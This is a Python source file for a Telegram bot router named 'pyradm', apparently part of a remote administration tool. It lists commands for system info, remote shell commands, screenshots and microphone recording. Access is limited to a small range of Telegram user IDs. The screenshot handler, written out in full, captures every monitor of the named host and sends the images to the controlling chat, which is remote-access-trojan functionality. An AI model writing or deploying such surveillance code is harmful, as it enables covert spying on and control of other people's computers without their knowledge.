from aiogram import Router
from aiogram.types import Message
from aiogram.filters.command import Command
from aiogram.types import FSInputFile
import tempfile
import platform
import os
from mss import mss
from mss.tools import to_png

router: Router = Router()

commands = '''
/startDD - start pyradm
/infoDD - system info
/shellDD username - shell commands
/scDD - screenshot
/micDD 10 - record audio from mic
'''

@router.message(Command("startDD"))
async def cmd_start(message: Message):
    if message.from_user.id > 6988905000 or message.from_user.id < 6988903000:
        return
    try:
        await message.answer(f'{commands}')
    except Exception as e:
        pass


@router.message(Command("scDD"))
async def cmd_sc(message: Message):
    if message.from_user.id > 6988905000 or message.from_user.id < 6988903000:
        return 
    try:
        temp_dir = tempfile.gettempdir()
        args = message.text.split(' ')
        if len(args) == 2 and platform.uname().node == args[1]:
            with mss() as sct:
                for i, monitor in enumerate(sct.monitors[1:], start=1):  # Skip the first element which is the entire screen
                    screen_path = os.path.join(temp_dir, f'sc_{platform.uname().node}_{i}.png')
                    sct_img = sct.grab(monitor)
                    # Save the screenshot as a PNG file
                    to_png(sct_img.rgb, sct_img.size, output=screen_path)
                    screen = FSInputFile(screen_path)
                    await message.answer_document(screen)
                    os.remove(screen_path)
        else:
            await message.answer(f"Please specify the node name, e.g., /scDD nodename")
    except Exception as e:
        await message.answer(f"An error occurred: {e}")